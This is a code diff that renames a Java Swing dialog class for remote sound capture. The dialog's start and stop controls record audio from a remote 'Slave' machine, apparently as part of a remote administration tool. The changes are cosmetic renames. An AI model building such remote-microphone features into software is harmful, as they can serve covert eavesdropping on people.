@@ -24,7 +24,7 @@ import javax.swing.border.EmptyBorder;
 
 
 @SuppressWarnings({ "serial", "rawtypes", "unchecked" })
-public class FrameRemoteSoundCapture extends BaseDialog {
+public class DialogRemoteSoundCapture extends BaseDialog {
 
 	private JPanel contentPane;
 	private Slave slave;
@@ -32,10 +32,10 @@ public class FrameRemoteSoundCapture extends BaseDialog {
 	private JButton btnStop;
 	public Packet58SoundCapture packet;
 
-	public static HashMap<Slave, FrameRemoteSoundCapture> instances = new HashMap<Slave, FrameRemoteSoundCapture>();
+	public static HashMap<Slave, DialogRemoteSoundCapture> instances = new HashMap<Slave, DialogRemoteSoundCapture>();
 	private JComboBox comboBox;
 
-	public FrameRemoteSoundCapture(Slave sl) {
+	public DialogRemoteSoundCapture(Slave sl) {
 		super();
 		addWindowListener(new WindowAdapter() {
 			@Override
@@ -44,7 +44,7 @@ public class FrameRemoteSoundCapture extends BaseDialog {
 			}
 		});
 		setResizable(false);
-		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteSoundCapture.class.getResource("/icons/microphone.png")));
+		setIconImage(Toolkit.getDefaultToolkit().getImage(DialogRemoteSoundCapture.class.getResource("/icons/microphone.png")));
 		this.slave = sl;
 		packet = new Packet58SoundCapture();
 		instances.put(slave, this);
@@ -64,7 +64,7 @@ public class FrameRemoteSoundCapture extends BaseDialog {
 				comboBox.setEnabled(false);
 			}
 		});
-		btnStart.setIcon(new ImageIcon(FrameRemoteSoundCapture.class.getResource("/icons/microphone_plus.png")));
+		btnStart.setIcon(new ImageIcon(DialogRemoteSoundCapture.class.getResource("/icons/microphone_plus.png")));
 
 		btnStop = new JButton("Stop");
 		btnStop.addActionListener(new ActionListener() {
@@ -77,7 +77,7 @@ public class FrameRemoteSoundCapture extends BaseDialog {
 			}
 		});
 		btnStop.setEnabled(false);
-		btnStop.setIcon(new ImageIcon(FrameRemoteSoundCapture.class.getResource("/icons/microphone_minus.png")));
+		btnStop.setIcon(new ImageIcon(DialogRemoteSoundCapture.class.getResource("/icons/microphone_minus.png")));
 
 		comboBox = new JComboBox();
 		comboBox.setModel(new DefaultComboBoxModel(new String[] { "16000", "12000", "8000", "4000", "2000" }));
